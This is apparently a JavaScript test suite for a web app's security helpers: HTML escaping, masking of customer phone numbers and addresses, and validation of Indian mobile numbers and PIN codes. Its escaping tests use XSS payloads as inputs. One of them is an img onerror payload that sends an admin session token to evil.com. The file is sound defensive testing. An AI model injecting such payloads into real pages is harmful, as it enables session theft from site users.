/**
 * Test Suite: Security, Input Validation & PII Protection
 */
(() => {
const { describe, test, expect } = (typeof module !== 'undefined' && module.exports)
  ? require('./test-utils')
  : window.TestFramework;

const {
  escapeHtml,
  maskPhone,
  maskAddress,
  validatePhone,
  validatePincode
} = (typeof module !== 'undefined' && module.exports)
  ? require('../js/security')
  : window;

describe('Security & Data Sanitization', () => {

  test('Neutralizes script tag injection payloads', () => {
    const malicious = '<script>alert("hacked")</script>';
    const safe = escapeHtml(malicious);
    expect(safe).toBe('&lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;');
    expect(safe.includes('<')).toBe(false);
    expect(safe.includes('>')).toBe(false);
  });

  test('Neutralizes image onerror XSS payloads in customer input', () => {
    const malicious = '<img src=x onerror="fetch(`https://evil.com/?token=`+localStorage.getItem(`admin_session`))">';
    const safe = escapeHtml(malicious);
    expect(safe.includes('<img')).toBe(false);
    expect(safe).toContain('&lt;img');
    expect(safe).toContain('&quot;');
  });

  test('Neutralizes SVG and iframe injection payloads', () => {
    const svgPayload = '<svg onload=alert(1)>';
    const iframePayload = '<iframe src="javascript:alert(1)"></iframe>';
    expect(escapeHtml(svgPayload)).toBe('&lt;svg onload=alert(1)&gt;');
    expect(escapeHtml(iframePayload)).toBe('&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;');
  });

  test('Handles null, undefined, and non-string values safely', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(12345)).toBe('12345');
    expect(escapeHtml(false)).toBe('false');
  });

  test('Masks phone numbers to protect customer privacy on public tracking', () => {
    expect(maskPhone('9876543210')).toBe('98******10');
    expect(maskPhone('919876543210')).toBe('91******10');
    expect(maskPhone('')).toBe('');
  });

  test('Masks house/flat details while preserving city and state for tracking', () => {
    const fullAddress = 'Flat 402, Lotus Apartments, 12th Cross | Pune, Maharashtra | 411038';
    const masked = maskAddress(fullAddress);
    expect(masked).toContain('••••••••');
    expect(masked).toContain('Pune, Maharashtra');
    expect(masked).toContain('411038');
    expect(masked.includes('Flat 402')).toBe(false);
  });

  test('Validates 10-digit Indian mobile numbers strictly', () => {
    expect(validatePhone('9876543210')).toBe(true);
    expect(validatePhone('8007768327')).toBe(true);
    expect(validatePhone('7012345678')).toBe(true);
    expect(validatePhone('6200000000')).toBe(true);

    // Invalid numbers:
    expect(validatePhone('12345')).toBe(false); // Too short
    expect(validatePhone('987654321099')).toBe(false); // Too long
    expect(validatePhone('0123456789')).toBe(false); // Starts with 0
    expect(validatePhone('abcdefghij')).toBe(false); // Letters
    expect(validatePhone('')).toBe(false); // Empty
  });

  test('Validates 6-digit Indian PIN codes strictly', () => {
    expect(validatePincode('411048')).toBe(true);
    expect(validatePincode('110001')).toBe(true);
    expect(validatePincode('403001')).toBe(true);

    // Invalid PIN codes:
    expect(validatePincode('41104')).toBe(false); // 5 digits
    expect(validatePincode('4110489')).toBe(false); // 7 digits
    expect(validatePincode('011048')).toBe(false); // Starts with 0
    expect(validatePincode('abcdef')).toBe(false); // Letters
    expect(validatePincode('')).toBe(false);
  });
});
})();
